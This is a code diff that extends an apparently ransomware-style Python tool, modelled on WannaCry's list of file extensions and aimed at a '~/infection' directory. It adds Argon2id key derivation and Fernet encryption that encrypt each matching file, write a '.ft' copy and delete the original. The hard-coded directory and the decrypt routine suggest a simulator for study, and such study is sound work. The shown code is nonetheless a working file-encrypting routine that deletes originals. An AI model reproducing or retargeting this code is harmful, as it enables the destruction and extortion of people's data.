@@ -2,12 +2,18 @@
 
 import argparse
 import sys
+import os
+import base64
 from pathlib import Path
+from argon2.low_level import hash_secret_raw, Type
+from cryptography.fernet import Fernet
 
 VERSION = "1.0.0"
+MAGIC = b"STK1"
+SALT_SIZE = 16
 TARGET_DIR = Path.home() / "infection"
 WANNA_CRY_EXTENSIONS = {
-    '.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.accdb', '.aes', '.ai', '.ARC',
+    '.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.accdb', '.aes', '.ai', '.arc',
     '.asc', '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2',
     '.c', '.cgm', '.class', '.cmd', '.cpp', '.crt', '.cs', '.csr', '.csv', '.db', '.dbf', '.dch',
     '.der', '.dif', '.dip', '.djvu', '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx',
@@ -43,8 +49,32 @@ def iter_files(root, reverse):
             ext = path.suffix.lower()
             if ext in WANNA_CRY_EXTENSIONS:
                 yield path
+                
+def derive_key(password, salt) -> bytes:
+    raw = hash_secret_raw(
+        secret=password.encode("utf-8"),
+        salt=salt,
+        time_cost=2,
+        memory_cost=19456,  # 19 MB
+        parallelism=1,
+        hash_len=32,
+        type=Type.ID  # Argon2id
+    )
+    return base64.urlsafe_b64encode(raw)
 
 def encrypt_file(filepath, password, silent):
+    salt = os.urandom(SALT_SIZE)
+    key = derive_key(password, salt)
+    fernet = Fernet(key)
+    
+    data = filepath.read_bytes()
+    encrypted = fernet.encrypt(data)
+    
+    payload = MAGIC + salt + encrypted
+    encrypted_path = filepath.with_name(filepath.name + ".ft")
+    encrypted_path.write_bytes(payload)
+    filepath.unlink()
+    
     log(f"Encrypted: {filepath.name}", silent)
 
 def decrypt_file(filepath, password, silent):
